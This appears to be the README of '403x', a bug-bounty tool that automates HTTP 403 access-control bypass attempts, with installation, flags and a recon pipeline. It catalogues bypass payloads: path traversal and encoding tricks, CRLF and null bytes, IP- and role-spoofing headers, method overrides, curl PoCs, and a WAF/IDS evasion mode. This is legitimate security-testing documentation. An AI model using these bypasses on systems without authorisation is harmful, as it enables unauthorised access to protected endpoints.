```
███████╗ ██████╗ ██████╗ ██╗  ██╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗╚██╗██╔╝╚██╗██╔╝
█████╗  ██║   ██║██████╔╝ ╚███╔╝  ╚███╔╝ 
██╔══╝  ██║   ██║██╔══██╗ ██╔██╗  ██╔██╗ 
██║     ╚██████╔╝██║  ██║██╔╝ ██╗██╔╝ ██╗
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

  Advanced 403 Bypass Recon Framework
  by Arookiech | Bug Bounty | Security Research
```

> **979 bypass attempts per URL** across path manipulation, header injection, method override, protocol and port variation — fully automated, Burp-ready, and pipeline-friendly.

---

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [All Flags](#all-flags)
- [Bypass Techniques](#bypass-techniques)
- [Bug Bounty Pipeline](#bug-bounty-pipeline)
- [Burp Suite Integration](#burp-suite-integration)
- [Output & Reporting](#output--reporting)
- [False Positive Reduction](#false-positive-reduction)
- [Disclaimer](#disclaimer)

---

## Overview

403x is a high-performance reconnaissance and security testing framework that automates the discovery and exploitation of HTTP 403 (Forbidden) access control bypass vulnerabilities. It is designed for bug bounty hunters and penetration testers who routinely hit protected endpoints like:

```
/admin          /dashboard      /internal
/api/private    /console        /config
```

These endpoints return `403 Forbidden` but are often accessible due to misconfigured reverse proxies, load balancers, WAFs, or application-level access control logic. 403x fires **979 unique bypass attempts per URL** across 5 attack categories and reports every successful response clearly.

### Payload Statistics

| Category              | Count |
|-----------------------|-------|
| Path variants per URL | 149   |
| Header injection sets | 810   |
| HTTP methods          | 12    |
| Protocol variants     | 2     |
| Port variants         | 6     |
| **Total per URL**     | **979** |

Run `403x --stats` at any time to see these numbers live.

---

## Installation

**Requirements:** Python 3.10+

```bash
git clone https://github.com/iamjhae/403xKiech.git
cd 403xBypass
pip install -r requirements.txt
```

Install globally (adds `403x` to PATH):

```bash
pip install .
403x --help
```
or for linux distro's that no longer support pip
```bash
pipx install .
403x --help
```
Or run directly without installing:

```bash
python 403x.py --help
```

---

## Quick Start

```bash
# Single endpoint
403x -u https://target.com/admin

# List of URLs (from httpx, ffuf output, etc.)
403x -l urls.txt -o results.txt

# Auto-discover 403 endpoints on a domain, then bypass them all
403x -u https://target.com --discover

# Route everything through Burp Suite
403x -l urls.txt -p http://127.0.0.1:8080

# Check payload counts
403x --stats

# Bug bounty integration cheatsheet
403x --tips
```

---

## Usage

### Single URL

Scan one known protected endpoint:

```bash
403x -u https://target.com/admin
```

### URL List

Feed a file of endpoints — one per line. Lines starting with `#` are treated as comments.

```bash
403x -l urls.txt
```

Example `urls.txt`:

```
# Admin panels
https://target.com/admin
https://target.com/dashboard
https://api.target.com/internal

# Staging environment
https://staging.target.com/console
https://staging.target.com/api/private
```

This is the recommended mode in bug bounty workflows. Pipe `httpx` or `ffuf` output directly into a file and feed it here.

### Auto-Discover Endpoints

When you only have a base domain, use `--discover` to probe 80+ common sensitive paths first. All endpoints returning `401` or `403` are collected and fed straight into the bypass engine:

```bash
403x -u https://target.com --discover
```

You can combine this with a list of domains:

```bash
403x -l domains.txt --discover
```

### Performance Tuning

```bash
# High-speed scan with 50 threads
403x -l urls.txt -t 50

# Stealth scan — slow down to avoid WAF/IDS triggers
403x -l urls.txt -t 5 --delay 0.5

# Stop each URL after 3 confirmed bypasses (fast mode for large lists)
403x -l urls.txt --max-bypass 3
```

---

## All Flags

### Targets

| Flag | Description |
|------|-------------|
| `-u URL` | Single target URL |
| `-l FILE` | File with one URL per line |
| `--discover` | Auto-discover 403/401 endpoints on base domain(s) before scanning |

### Scanner

| Flag | Default | Description |
|------|---------|-------------|
| `-t N` | `30` | Thread count |
| `--timeout SEC` | `10` | Per-request timeout in seconds |
| `--delay SEC` | `0` | Delay between requests (rate-limit evasion) |
| `--force` | off | Attempt bypasses even if the endpoint is not 401/403 |
| `--max-bypass N` | `0` | Stop after N confirmed bypasses per URL (`0` = unlimited) |
| `--verify-ssl` | off | Enable SSL certificate verification (disabled by default) |
| `--user-agent UA` | `403x/1.0` | Custom User-Agent string |

### Network

| Flag | Description |
|------|-------------|
| `-p URL` | Proxy URL — e.g. `http://127.0.0.1:8080` for Burp Suite |

### Output

| Flag | Default | Description |
|------|---------|-------------|
| `-o FILE` | `bypass_results.txt` | Save results to file |
| `--quiet` | off | Only print confirmed bypass successes |
| `--no-banner` | off | Suppress the ASCII banner |
| `--stats` | — | Print payload statistics and exit |
| `--tips` | — | Print the bug bounty integration guide and exit |

---

## Bypass Techniques

### 1 · Path Manipulation — 149 variants

Every unique combination of the following applied to the target path:

**Suffix appending**

| Technique | Example |
|-----------|---------|
| Trailing slash | `/admin/` |
| Double / triple slash | `/admin//`, `/admin///` |
| Trailing dot | `/admin/.` |
| Dot-slash | `/admin/./` |
| Dot-dot | `/admin/..` |
| Semicolon tricks | `/admin;`, `/admin;a`, `/admin..;/` |
| Null byte | `/admin%00` |
| Whitespace variants | `/admin%20`, `/admin%09`, `/admin%0a`, `/admin%0d%0a` |
| Query string append | `/admin?`, `/admin?debug=true`, `/admin?id=1` |
| Fragment | `/admin#` |
| Extension appending | `/admin.json`, `/admin.php`, `/admin.html`, `/admin.bak`, `/admin.old` … (40+ extensions) |
| Sensitive backup patterns | `/admin.env.bak`, `/admin.env.old`, `/admin.env~`, `/admin.env.production` |
| Tilde / backtick | `/admin~`, `/admin\`` |
| CRLF injection | `/admin%0d%0a` |

**Prefix injection**

| Technique | Example |
|-----------|---------|
| Double slash | `//admin` |
| Dot-slash | `/./admin` |
| Dot-dot-slash | `/../admin` |
| URL-encoded slash | `/%2f/admin` |
| URL-encoded backslash | `/%5c/admin` |
| Double-encoded slash | `/%252f/admin` |
| Overlong UTF-8 slash | `/%c0%af/admin`, `/%c1%9c/admin` |
| Semicolon prefix | `/;/admin` |

**Mid-path insertion** (for multi-segment paths like `/api/admin`)

```
/api/./admin      /api/../admin     /api/;/admin
/api//admin       /api/%20/admin    /api/..;/admin
```

**Encoding tricks**

| Technique | Example |
|-----------|---------|
| URL-encoded slash | `/api%2fadmin` |
| Double URL-encoded | `/api%252fadmin` |
| Backslash encoded | `/api%5cadmin` |
| Double backslash encoded | `/api%255cadmin` |
| Unicode slash | `/api\u2215admin` |
| Overlong UTF-8 (AF) | `/api%c0%afadmin` |
| Overlong UTF-8 (9C) | `/api%c1%9cadmin` |
| Overlong UTF-8 (E0) | `/api%e0%80%afadmin` |

**Case mutations**

```
/ADMIN    /admin    /Admin    /aDmIn    /AdMiN
```

**Dot-segment normalization tricks**

```
/./admin    /../admin    /admin/.    /admin/./
/%2e/admin  /%2e%2e/admin  /%252e/admin
```

**Semicolon injection** (Tomcat / Spring path parameter bypass)

```
/;admin           /api/;/admin       /admin;
/admin..;/        /api/..;/admin
```

**Other**

```
/admin/*          /admin/?
http:/admin       https:/admin       (absolute URL in path)
/admin/web.config  /admin/.htaccess  /admin/settings.py
```

---

### 2 · Header Injection — 810 sets

**IP spoofing headers** × 16 values each

```
X-Forwarded-For          X-Forwarded-Host         X-Forwarded-Server
X-Originating-IP         X-Remote-IP              X-Remote-Addr
X-Client-IP              X-Host                   X-Real-IP
X-Custom-IP-Authorization  X-Cluster-Client-IP    X-ProxyUser-Ip
True-Client-IP           CF-Connecting-IP         Fastly-Client-IP
X-Azure-ClientIP         X-Azure-SocketIP         Forwarded
Via                      Contact                  X-Backend-Host
Base-Url                 Proxy-Host               Referer
Uri                      Url                      X-Server-IP …
```

Spoof values: `127.0.0.1`, `127.1`, `localhost`, `0.0.0.0`, `::1`, `10.0.0.1`, `172.16.0.1`, `127.0.0.1, 127.0.0.2`, `root`, `admin`, `internal` …

**URL / path rewrite headers** × 14 path values each

```
X-Original-URL    X-Rewrite-URL     X-Forwarded-Path
X-Override-URL    X-Proxy-URL       X-Servlet-Path
X-Request-URI     X-Path-Info       X-Original-URI
```

Path values: `{path}`, `/`, `/.`, `/;{path}`, `/..;{path}`, `{path}%20`, `{path};`, `/%2e{path}` …

**HTTP method override headers**

```
X-HTTP-Method-Override: GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS
X-Method-Override       X-Original-Method       _method
```

**Auth / role spoofing**

```
X-Admin: true            X-Is-Admin: true         X-Role: admin
X-User-Role: admin       X-Roles: admin           X-User-Groups: admin
X-Auth-Token: admin      X-Auth-User: admin       X-User-ID: 0
Authorization: Bearer admin
Cookie: admin=true       Cookie: isAdmin=true      Cookie: role=admin
```

**Host header manipulation**

```
Host: localhost    Host: 127.0.0.1    Host: internal    Host: admin
```

**Protocol / port / scheme tricks**

```
X-Forwarded-Proto: https/http     X-Forwarded-Scheme: https/http
X-Forwarded-Port: 443/80/8080     Front-End-Https: on
```

**Misc internal tricks**

```
X-Requested-With: XMLHttpRequest    X-Debug: true
X-Internal: true                    X-Bypass: true
X-Internal-Token: internal          X-Api-Version: internal
Cache-Control: no-cache             Pragma: no-cache
```

---

### 3 · HTTP Method Override — 12 methods

```
GET  POST  PUT  PATCH  DELETE  OPTIONS  HEAD  TRACE  CONNECT  PROPFIND  PROPPATCH  MKCOL
```

---

### 4 · Protocol / Port Variation

- HTTP ↔ HTTPS scheme swap
- Port variants: `80`, `443`, `8080`, `8443`, `8000`, `3000`

---

## Bug Bounty Pipeline

Run `403x --tips` for the full guide. The core pipeline:

### Step 1 — Subdomain + Endpoint Discovery

```bash
subfinder -d target.com -silent | \
  httpx -mc 403,401 -silent | \
  tee urls.txt
```

### Step 2 — 403x Bypass Scan

```bash
403x -l urls.txt -t 50 -o bypass_results.txt
```

### Step 3 — Deeper Fuzzing on Bypassed Endpoints

```bash
ffuf -u https://target.com/admin/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,201,202,204
```

### Step 4 — Chain with Nuclei

```bash
grep "BYPASS SUCCESS" bypass_results.txt | \
  awk '{print $NF}' | \
  nuclei -t exposures/ -t cves/ -t misconfiguration/
```

### Step 5 — Writing the Report

A well-written bypass report includes:

1. **Original 403 request** — full URL, method, response code and content-length
2. **Bypass request** — exact URL / headers used
3. **Proof of access** — sanitised snippet of the response body (no actual sensitive data)
4. **Curl PoC** — ready to reproduce:

```bash
curl -sk -H "X-Original-URL: /admin" https://target.com/
curl -sk "https://target.com/admin/."
curl -sk -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
```

5. **CWE / OWASP mapping**:
   - CWE-284 — Improper Access Control
   - CWE-285 — Improper Authorization
   - OWASP A01:2021 — Broken Access Control

### Severity Guidance

| Severity | Access Gained |
|----------|---------------|
| Critical | RCE primitives, authentication bypass, full admin access |
| High | User data access, admin panel, sensitive configuration |
| Medium | Internal APIs, service configuration, unrestricted metrics |
| Low / Info | Status pages, dev endpoints, version disclosure |

---

## Burp Suite Integration

Start Burp's proxy listener on `127.0.0.1:8080` then:

```bash
403x -u https://target.com/admin -p http://127.0.0.1:8080
```

All 979 bypass attempts will appear in Burp's HTTP history. From there you can:

- Replay individual requests with modifications
- Send to Intruder for further fuzzing
- Examine response bodies that 403x reports as bypassed
- Use Burp's Comparer to diff a `403` body vs a `200` body

---

## Output & Reporting

### Live Terminal Output

```
[+] 4 target(s)  ·  979 requests/URL  ·  30 threads

  ✅  200  https://target.com/admin   (2 bypasses found)
       ⮕ [path:suffix:'/.'  ]  https://target.com/admin/.   200 len=4821
       ⮕ [hdr:X-Original-URL=/admin]  https://target.com/admin  200 len=4821
  🔒  403  https://target.com/console
  ✅  302  https://target.com/dashboard  (1 bypass found)
       ⮕ [method:OPTIONS]  https://target.com/dashboard   302 len=0
  ⏭   200  https://target.com/public

────────────────────────────────────────────────────────────
  SCAN COMPLETE — 2025-08-01 14:32:07
────────────────────────────────────────────────────────────
  Targets scanned : 4
  Bypasses found  : 3
```

### File Export (`bypass_results.txt`)

```
403x - Bypass Results
Generated: 2025-08-01T14:32:07
============================================================

TARGET: https://target.com/admin  [original status: 403]
  BYPASSES FOUND: 2
    [200] path:suffix:'/.'
    URL: https://target.com/admin/.

    [200] hdr:X-Original-URL=/admin
    URL: https://target.com/admin
    Header: X-Original-URL: /admin
```

---

## False Positive Reduction

Not every non-403 response is a genuine bypass. Before reporting:

1. **Compare content-length** — if the body is the same size as the original 403, the server may be returning a soft 200 with a `You are not authorised` page.
2. **Read the response body** — check for `window.location`, login forms, or error messages disguised as 200s.
3. **Follow redirects manually** — a 302 to `/login` is not a bypass.
4. **Test in browser** — confirm you can actually interact with the resource.
5. **Use `--max-bypass 1`** — stop at the first hit per URL and manually verify before mass-reporting.

```bash
# Quiet mode outputs only confirmed bypass lines — pipe to file for triage
403x -l urls.txt --quiet > hits.txt
```

---

## Project Structure

```
403xKiech/
├── 403x.py                  ← run directly
├── requirements.txt
├── setup.py                 ← pip install .
└── forbiddenx/
    ├── __init__.py
    ├── core.py              ← Scanner engine, all payload lists, path generator
    ├── cli.py               ← argument parser, entry point for pip install
    └── output.py            ← ANSI terminal output, file export
```

---

## Disclaimer

This tool is intended **strictly for authorised security testing and educational purposes**.

- Always obtain **explicit written permission** from the asset owner before scanning.
- Do not use against systems you do not own or have permission to test.
- The author accepts no responsibility for misuse or any damage caused by this tool.
- Ensure compliance with all applicable laws and the scope rules of any bug bounty programme you participate in.
